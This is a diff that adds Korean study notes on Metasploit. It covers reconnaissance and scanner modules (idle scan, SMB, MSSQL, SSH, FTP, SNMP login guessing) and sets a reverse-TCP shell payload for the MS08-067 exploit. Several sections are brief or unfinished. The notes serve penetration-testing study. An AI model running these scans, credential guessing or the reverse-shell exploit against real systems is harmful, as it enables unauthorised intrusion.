@@ -77,3 +77,99 @@ services
 vulns
 ```
 ![image](https://user-images.githubusercontent.com/61821641/152451547-bbdbaaa0-528f-4011-9c19-996466ee38a2.png)
+#
+`Interface`
+
+- msfconsole
+- msfcli
+- armitage
+
+`Utility`
+
+- msfpayload
+- msfencode
+- nasm_shell
+
+`DB`
+
+- mysql
+- postgreSQL
+#
+`수동적 정보 수집`
+
+`whois lookup`
+```
+msf6 > whois secmaniac.net
+```
+#
+`auxiliary/scanner/ip/ipidseq`
+
+TCP Idle 스캔
+
+네트워크에 있는 다른 호스트의 IP 주소를 스푸핑해 은닉 상태로 대상을 스캔할 수 있다. 스캔을 수행할 때 ip 헤더의 ID필드의 증가를 고려해야 하므로 
+
+
+#
+`auxiliary/scanner/portscan/syn`
+
+
+#
+`auxiliary/scanner/smb/smb_version`
+
+![image](https://user-images.githubusercontent.com/61821641/154093665-d1f2834b-0819-40b5-9fe7-c3a76f67ac83.png)
+
+#
+`auxiliary/scanner/mssql/mssql_ping`
+
+잘못 설정된 mssql 서버 찾기
+
+MS SQL을 설치하면 기본적으로 TCP 1433번 포트나 임의의 동적 TCP 포트로 응답 대기한다. MS SQL이 동적 포트로 대기한다면 간단히 UDP 포트 1434번으로 신호를 보내 MS SQL이 대기 중인 동적 TCP 포트를 확인할 수 있다. mssql_ping 모듈로 이 작업을 수행할 수 있다.
+
+mssql_ping은 UDP의 timeout 문제로 인해 대상 서브넷까지 패킷이 상당히 느리게 이동할 수 있다. 메타스플로잇이 MS SQL 서버를 찾으면 서버가 대기 중인 TCP 포트 정보 같은 중요 정보와 세부 내용을 출력한다.
+
+![image](https://user-images.githubusercontent.com/61821641/154096105-7ebff2c2-7706-4ffc-ace8-cf6646f03b68.png)
+
+1: 서버의 위치
+
+2: 인스턴스 명
+
+3: 서버버전
+
+4: 대기중인 tcp 포트 번호
+
+#
+`auxiliary/scanner/ssh/ssh_version`
+
+ssh_version 모듈은 대상 서버에서 동작하는 SSH의 버전을 알아낸다.
+
+#
+`auxiliary/scanner/ftp/ftp_version`
+
+ftp_version 모듈은 대상 서버에서 동작하는 FTP의 버전을 알아낸다.
+
+#
+`auxiliary/scanner/ftp/anonymous`
+
+FTP 서버가 익명 접속을 허용하는지 확인
+
+#
+`auxiliary/scanner/snmp/snmp_login` 
+
+조직에 1000개의 장치가 있는 경우 매일 하나씩 모든 장치가 제대로 작동하는지 확인하는 것은 바쁜 작업이다. 이를 용이하게 하기 위해 SNMP(Simple Network Management Protocol)가 사용된다. 
+
+SNMP 서버로 접근해 특정 시스템에 대한 상당한 정보를 얻거나 원격 장치를 손상시킬 수 있다. 
+
+snmp_login 모듈을 사용하면 단이 IP 주소나 IP 주소 범위에 대해 단어 목록을 시도해볼 수 있다.
+
+#
+`exploit/windows/smb/ms08_067_netapi`
+
+```
+set payload windows/shell/reverse_tcp
+```
+show options를 입력하면 lhost, lport 옵션이 추가된걸 확인할 수 있다.
+![image](https://user-images.githubusercontent.com/61821641/154139664-f3f3be69-3ca9-4a55-a29c-e5d8e0aa6c8a.png)
+
+```
+show targets
+```
